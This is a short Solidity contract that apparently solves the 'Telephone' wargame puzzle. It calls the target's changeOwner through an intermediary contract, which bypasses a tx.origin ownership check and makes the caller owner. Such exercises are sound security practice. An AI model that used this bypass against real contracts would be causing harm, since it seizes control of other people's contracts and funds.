pragma solidity ^0.8.0;

interface Telephone  {
    function changeOwner(address _owner) external;
}

contract Solver {
    Telephone challenge;

    constructor(address addr) {
        challenge = Telephone(addr);
    }

    function solve() external payable {
        challenge.changeOwner(msg.sender);
    }

    receive() external payable {}
}
